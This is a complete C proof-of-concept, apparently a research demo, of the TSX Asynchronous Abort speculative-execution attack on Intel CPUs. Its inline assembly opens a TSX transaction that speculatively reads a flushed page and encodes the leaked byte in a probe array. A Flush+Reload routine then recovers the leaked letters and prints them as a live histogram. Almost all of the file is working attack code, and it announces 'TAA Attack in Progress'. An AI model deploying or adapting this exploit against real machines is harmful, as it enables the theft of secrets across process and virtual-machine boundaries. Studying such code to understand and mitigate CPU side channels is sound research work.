#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include "cacheutils.h"

int print_once = 0;
#define FROM 'A'
#define TO   'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
volatile long long aborted = 0;
volatile long long not_aborted = 0;
volatile int temp_cnter = 0;
#define CNTER_LIMIT 1000
void recover(void);
volatile bool abort_flag = 0;

volatile long long temp_cnt = 0;
long long temp = 0;
int dots = 0;
int positive = 1;
int last_abort = 0;
int last_noabort = 0;
int abrt_cnter = 0;
int main(int argc, char *argv[])
{
  if(!has_tsx()) {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

  memset(mem, 0, sizeof(mem));

  int line = 33;
  if (argc > 1) {
	  line =  atoi(argv[1]);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  while (true) {
	  if (!print_once) {
		  print_once = 1;
		  printf("TAA Attack in Progress...\n");
	  }
	    __asm__ __volatile__ (
			"movq %3, %%rdi;"				// Move mapping (leak source) to "rdi"
			"clflush (%%rdi);"				// Flush Mapping array
			"movq %4, %%rsi;"				// Move mem (Timings / Flush+Reload Channel) to "rsi"
			"xbegin 2f;"					// Start TSX Transaction
			"movq (%%rdi), %%rax;"			// Leak a single byte from mapping (leak source) and speculatively load in rax register
			"shl $12, %%rax;"				// Multiply leak source with 4096 256x4096, i.e. 4096 entries apart each byte
			"andq $0xff000, %%rax;"			// We are only interested in 256 bytes uppper than 4096
			"movq (%%rax, %%rsi), %%rax;"	// Use the leak byte as a index to load into Timing (F+R) Channel. Its footprint will be left on cache
			"xend;"							// End TSX Transaction
			"movq %1, %%rcx;"
			"incq %%rcx;"
			"movq %%rcx, %1;"
			"movq $0, %0;"
			"jmp 3f;"
			"2:"
			"movq %2, %%rdx;"
			"incq %%rdx;"
			"movq %%rdx, %2;"
			"movq $1, %0;"
			"3:;"
			: "=g"(abort_flag), "=g"(aborted), "=g"(not_aborted) : "r" (mapping), "r" (mem), "r"(aborted), "r"(not_aborted) : "rcx", "rdx"
	    );

	    if (abort_flag) {
	    	abrt_cnter++;
	    }

	     if (temp++ > 50000) {
	    	 temp = 0;
	 	    abrt_cnter = 0;
		 }
    /* Recover through probe mem array */
    recover();
  }

  return 0;
}

int timeout = 0;
volatile long long not_update = 0;

/*
 * Flush Reload attack to recover values
 */
void recover(void) {
    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }

    if (update == true /*|| (++not_update > 1000000)*/)
    {
    	not_update = 0;
        printf("\x1b[2J");

        int max = 1;

        if (timeout++ > 200)
        {
        	timeout = 0;

			for (int i = FROM; i <= TO; i++) {
			  if (hist[i] > max) {
				max = hist[i];
			  }
			}

			for (int i = FROM; i <= TO; i++) {
				printf("%c: (%4u) ", i, (unsigned int)hist[i]);
				for (int j = 0; j < hist[i] * 60 / max; j++) {
				  printf("#");
				}
				printf("\n");
			}
			printf("Aborted_Count: %lld\n", aborted);
			printf("Not_Aborted_Count: %lld\n", not_aborted);
			printf("Percentage Abort => %f\n", (float) (aborted * 100) / not_aborted);

			fflush(stdout);
        }
    }
}
